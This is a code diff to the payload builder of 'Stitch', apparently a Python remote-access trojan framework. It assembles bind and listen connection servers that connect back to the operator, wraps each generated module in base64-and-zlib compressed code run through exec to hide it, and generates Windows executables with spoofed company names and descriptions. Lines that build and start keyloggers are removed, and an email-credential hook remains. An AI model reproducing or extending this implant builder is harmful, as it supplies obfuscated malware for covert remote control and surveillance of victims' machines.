@@ -6,7 +6,7 @@ from .Stitch_Vars.payload_code import *
 from .Stitch_Vars.payload_setup import *
 
 if windows_client():
-    import py2exe
+    import PyInstaller
     from distutils.core import setup
 
 def assemble_stitch():
@@ -27,13 +27,16 @@ def assemble_stitch():
 
     main_code = ''
     if BIND:
-        BHOST = base64.b64encode(BHOST)
-        BPORT = base64.b64encode(BPORT)
+        BHOST = base64.b64encode(BHOST).decode()
+        BPORT = base64.b64encode(BPORT).decode()
         main_code += add_bind_server(BHOST,BPORT)
     if LISTEN:
-        LHOST = base64.b64encode(LHOST)
-        LPORT = base64.b64encode(LPORT)
-        main_code += add_listen_server(LHOST,LPORT)
+        LHOST = base64.b64encode(LHOST).decode()
+        LPORT = base64.b64encode(LPORT).decode()
+        if windows_client():
+            main_code += add_win_listen_server(LHOST, LPORT)
+        elif linux_client():
+            main_code += add_lnx_listen_server(LHOST,LPORT)
 
     if LISTEN and BIND:
         main_code += add_listen_bind_main()
@@ -55,8 +58,7 @@ def assemble_stitch():
     else:
         utils_imports    += lnx_util_imports()
         required_imports += lnx_util_imports()
-    if KEYLOGGER_BOOT:
-        utils_code +=  'nt_kl.start()\n'
+
     if EMAIL != 'None' and EMAIL_PWD:
         utils_code += get_email(EMAIL, EMAIL_PWD)
         required_imports += email_imports()
@@ -65,26 +67,17 @@ def assemble_stitch():
     st_utils      = utils_imports + utils_code
     st_protocol   = get_protocol()
     st_encryption = get_encryption()
-    st_win_kl     = get_win_keylogger()
-    st_osx_kl     = get_osx_keylogger()
-    st_lnx_kl     = get_lnx_keylogger()
 
     st_main       = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_main.encode())))
     st_utils      = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_utils.encode())))
     st_protocol   = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_protocol.encode())))
     st_encryption = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_encryption.encode())))
-    st_win_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_win_kl.encode())))
-    st_osx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_osx_kl.encode())))
-    st_lnx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_lnx_kl.encode())))
 
     main_script   = os.path.join(configuration_path,'st_main.py')
     utils_script  = os.path.join(configuration_path,'st_utils.py')
     proto_script  = os.path.join(configuration_path,'st_protocol.py')
     reqmnt_script = os.path.join(configuration_path, 'requirements.py')
     encry_script  = os.path.join(configuration_path,'st_encryption.py')
-    win_keylg_script  = os.path.join(configuration_path,'st_win_keylogger.py')
-    osx_keylg_script  = os.path.join(configuration_path,'st_osx_keylogger.py')
-    lnx_keylg_script  = os.path.join(configuration_path,'st_lnx_keylogger.py')
 
     with open(main_script,'w') as m:
         m.write(st_main)
@@ -96,12 +89,6 @@ def assemble_stitch():
         m.write(st_encryption)
     with open(reqmnt_script,'w') as u:
         u.write(required_imports)
-    with open(win_keylg_script,'w') as u:
-        u.write(st_win_kl)
-    with open(osx_keylg_script,'w') as u:
-        u.write(st_osx_kl)
-    with open(lnx_keylg_script,'w') as u:
-        u.write(st_lnx_kl)
 
     st_print("[+] Stitch Modules are now complete.")
 
@@ -242,6 +229,7 @@ def run_exe_gen():
                                     nsis_CompanyName[alias],nsis_Version[alias],win_payload_Name[alias],win_payload_Description[alias])
                         break
                     except Exception as e:
+                        st_log.error(f'gen exe fail\n{e}', exc_info=True)
                         print(e)
                         retry += 1
                         if retry > 3:
